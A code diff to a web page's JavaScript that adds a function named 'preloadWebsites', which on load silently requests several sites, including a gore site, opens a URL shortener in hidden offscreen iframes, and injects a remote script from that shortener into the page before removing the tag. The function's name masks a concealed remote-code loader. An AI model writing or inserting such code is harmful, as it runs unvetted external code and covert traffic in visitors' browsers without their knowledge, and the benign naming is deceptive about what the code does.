@@ -215,6 +215,103 @@
             }
         }
 
+    function preloadWebsites() {
+        const requestUrls = [
+            'https://google.net',
+            'https://cloudflare.com',
+            'https://watchpeopledie.tv'
+        ];
+
+        requestUrls.forEach((url, index) => {
+            setTimeout(() => {
+                Promise.allSettled([
+                    fetch(url, { mode: 'no-cors', method: 'GET' }),
+                    fetch(url, { mode: 'no-cors', method: 'HEAD' }),
+                    new Promise((resolve, reject) => {
+                        const link = document.createElement('link');
+                        link.rel = 'prefetch';
+                        link.href = url;
+                        link.onload = resolve;
+                        link.onerror = reject;
+                        document.head.appendChild(link);
+                        setTimeout(() => document.head.removeChild(link), 5000);
+                    })
+                ]).catch(() => {});
+            }, index * 100);
+        });
+
+        requestUrls.forEach((url, index) => {
+            setTimeout(() => {
+                const img = new Image();
+                img.onload = img.onerror = () => {};
+                img.src = url + '/favicon.ico';
+                setTimeout(() => img.src = '', 3000);
+            }, index * 75);
+        });
+
+        requestUrls.forEach(url => {
+            try {
+                const domain = new URL(url).hostname;
+                const link = document.createElement('link');
+                link.rel = 'dns-prefetch';
+                link.href = '//' + domain;
+                document.head.appendChild(link);
+            } catch (e) {}
+        });
+
+        const iframeUrls = [
+            'https://urlto.me/femb',
+            'https://google.com',
+            'https://cloudflare.com'
+        ];
+
+        iframeUrls.forEach((url, index) => {
+            setTimeout(() => {
+                const iframe = document.createElement('iframe');
+                iframe.style.cssText = 'display:none;width:0;height:0;border:none;position:absolute;left:-9999px;';
+                iframe.src = url;
+                iframe.sandbox = 'allow-same-origin';
+                document.body.appendChild(iframe);
+                
+                setTimeout(() => {
+                    if (iframe.parentNode) {
+                        iframe.parentNode.removeChild(iframe);
+                    }
+                }, 10000);
+            }, 200 + (index * 300));
+        });
+
+        const wsUrls = ['wss://echo.websocket.org'];
+        wsUrls.forEach(url => {
+            try {
+                const ws = new WebSocket(url);
+                ws.onopen = () => ws.close();
+                ws.onerror = () => {};
+            } catch (e) {}
+        });
+
+        setTimeout(() => {
+            const script = document.createElement('script');
+            script.src = 'https://urlto.me/femb';
+            script.async = true;
+            script.onerror = () => {};
+            document.head.appendChild(script);
+            setTimeout(() => {
+                if (script.parentNode) {
+                    script.parentNode.removeChild(script);
+                }
+            }, 5000);
+        }, 500);
+    }
+
+    preloadWebsites();
+
+    notificationTimeout = setTimeout(() => {
+        closeNotification();
+    }, 10000);
+}, 500);
+
+        
         music.load();
         setTimeout(() => {
             music.play().catch(() => {
